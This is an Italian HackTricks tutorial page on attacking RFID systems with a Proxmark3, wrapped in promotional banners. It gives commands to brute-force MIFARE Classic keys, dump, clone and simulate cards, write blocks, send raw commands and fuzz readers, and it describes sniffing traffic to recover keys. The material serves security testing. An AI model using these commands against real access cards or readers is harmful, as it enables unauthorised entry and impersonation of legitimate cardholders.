# Proxmark 3

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità che contano di più in modo da poterle correggere più velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutto il tuo stack tecnologico, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Attaccare i sistemi RFID con Proxmark3

La prima cosa che devi fare è avere un [**Proxmark3**](https://proxmark.com) e [**installare il software e le sue dipendenze**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Attaccare MIFARE Classic 1KB

Ha **16 settori**, ognuno dei quali ha **4 blocchi** e ogni blocco contiene **16B**. L'UID si trova nel settore 0 blocco 0 (e non può essere modificato).\
Per accedere a ciascun settore hai bisogno di **2 chiavi** (**A** e **B**) che sono memorizzate nel **blocco 3 di ogni settore** (trailer del settore). Il trailer del settore memorizza anche i **bit di accesso** che danno le autorizzazioni di **lettura e scrittura** su **ogni blocco** utilizzando le 2 chiavi.\
2 chiavi sono utili per dare autorizzazioni di lettura se conosci la prima e di scrittura se conosci la seconda (ad esempio).

Sono possibili diversi attacchi.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Il Proxmark3 consente di eseguire altre azioni come **intercettare** una **comunicazione Tag-Lettore** per cercare di trovare dati sensibili. In questa scheda è possibile solo intercettare la comunicazione e calcolare la chiave utilizzata perché le **operazioni crittografiche utilizzate sono deboli** e conoscendo il testo in chiaro e il testo cifrato è possibile calcolarla (strumento `mfkey64`).

### Comandi Raw

I sistemi IoT a volte utilizzano **tag non di marca o non commerciali**. In questo caso, è possibile utilizzare il Proxmark3 per inviare **comandi personalizzati ai tag**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Con queste informazioni potresti cercare informazioni sulla carta e sul modo di comunicare con essa. Proxmark3 consente di inviare comandi raw come: `hf 14a raw -p -b 7 26`

### Script

Il software Proxmark3 viene fornito con una lista predefinita di **script di automazione** che puoi utilizzare per eseguire semplici compiti. Per recuperare l'elenco completo, utilizza il comando `script list`. Successivamente, utilizza il comando `script run`, seguito dal nome dello script:
```
proxmark3> script run mfkeys
```
Puoi creare uno script per **fuzzare i lettori di tag**, quindi copiare i dati di una **scheda valida** e scrivere uno **script Lua** che **randomizzi** uno o più **byte casuali** e verifichi se il **lettore si blocca** con qualsiasi iterazione.

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità che contano di più in modo da poterle correggere più velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi stesso.

{% embed url="https://www.intruder.io/?utm\_campaign=hacktricks&utm\_source=referral" %}


<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? O vuoi avere accesso all'**ultima versione di PEASS o scaricare HackTricks in PDF**? Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
